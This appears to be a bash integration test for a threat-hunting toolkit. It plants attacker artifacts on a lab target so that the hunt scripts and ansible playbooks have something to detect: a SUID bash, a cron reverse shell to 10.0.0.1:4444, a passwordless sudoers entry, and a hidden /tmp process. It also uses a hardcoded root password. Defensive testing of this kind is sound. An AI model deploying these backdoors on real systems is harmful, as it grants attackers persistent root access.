#!/usr/bin/env bash
# Runs inside the 'runner' service: proves the hunts and the ansible playbooks work against a
# live Linux target. Connects by SSH password, so revoking keys never locks the runner out.
set -uo pipefail
TARGET=${TARGET:-target}
export SSHPASS
O="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5"
# shellcheck disable=SC2086
ssh_t() { sshpass -e ssh $O "root@$TARGET" "$@"; }

ok=1
check() { if eval "$2"; then echo "PASS $1"; else echo "FAIL $1"; ok=0; fi; }

echo "== wait for target"
for _ in $(seq 1 30); do ssh_t true 2>/dev/null && break; sleep 1; done
ssh_t true 2>/dev/null || { echo "target ssh never came up"; exit 1; }

echo "== script checks"
ssh_t 'mkdir -p /opt/pvj/hunt'
# shellcheck disable=SC2086
sshpass -e scp $O -r /work/linux/hunt/continuous /work/linux/hunt/active "root@$TARGET:/opt/pvj/hunt/"
ssh_t 'bash -s' <<'PLANT'
set -e
chmod u+s "$(command -v bash)"
printf '* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > /etc/cron.d/red
echo 'nobody ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/90-red
cp /bin/sleep /tmp/.beacon
setsid /tmp/.beacon 300 </dev/null >/dev/null 2>&1 &
PLANT

# Capture each hunt's output to a file (hunts exit 2 on findings; pipefail would mask a grep match)
for pair in continuous/get-privesc-findings.sh:privesc continuous/get-autostart-findings.sh:autostart \
            continuous/get-sshd-config-findings.sh:sshd active/get-lotl-findings.sh:lotl; do
  path=${pair%%:*}; name=${pair##*:}
  ssh_t "/opt/pvj/hunt/$path" >"/tmp/$name.out" 2>/dev/null; rc=$?
  check "$name exits 2 (findings found)" "[[ $rc -eq 2 ]]"
done
check "privesc flags SUID bash"       "grep -qE '^FAIL[[:space:]]suid' /tmp/privesc.out"
check "autostart flags cron backdoor" "grep -q /etc/cron.d/red /tmp/autostart.out"
check "lotl flags /tmp process"       "grep -q proc-tmp /tmp/lotl.out"

echo "== ansible checks"
cat > /tmp/inv.yml <<YAML
linux:
  hosts:
    $TARGET:
      ansible_user: root
      ansible_password: pvj
      ansible_connection: ssh
      ansible_ssh_common_args: '-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null'
YAML
export ANSIBLE_HOST_KEY_CHECKING=False
cd /work/ansible || exit 1

ansible-playbook -i /tmp/inv.yml hunt.yml -e run=full >/tmp/full.log 2>&1 || { echo "hunt.yml failed"; cat /tmp/full.log; ok=0; }
check "full run fetched lotl"    "test -s /work/findings/full/$TARGET/get-lotl-findings.tsv"
check "full run fetched privesc" "test -s /work/findings/full/$TARGET/get-privesc-findings.tsv"

ansible-playbook -i /tmp/inv.yml hunt.yml -e run=cont --tags continuous >/tmp/cont.log 2>&1 || { echo "continuous run failed"; cat /tmp/cont.log; ok=0; }
check "--tags continuous skips lotl"   "! test -e /work/findings/cont/$TARGET/get-lotl-findings.tsv"
check "--tags continuous runs privesc" "test -s /work/findings/cont/$TARGET/get-privesc-findings.tsv"

ssh-keygen -q -t ed25519 -N '' -f /tmp/team
ansible-playbook -i /tmp/inv.yml ssh-rotate.yml -e team_pub=/tmp/team.pub >/tmp/r1.log 2>&1 || { echo "ssh-rotate run1 failed"; cat /tmp/r1.log; ok=0; }
ansible-playbook -i /tmp/inv.yml ssh-rotate.yml -e team_pub=/tmp/team.pub >/tmp/r2.log 2>&1 || { echo "ssh-rotate run2 failed"; cat /tmp/r2.log; ok=0; }
check "ssh-rotate idempotent (changed=0)" "grep -qE '$TARGET *: ok=[0-9]+ *changed=0 ' /tmp/r2.log"

rm -rf /work/findings/full /work/findings/cont; rmdir /work/findings 2>/dev/null || true
echo "== done"
[[ $ok -eq 1 ]]
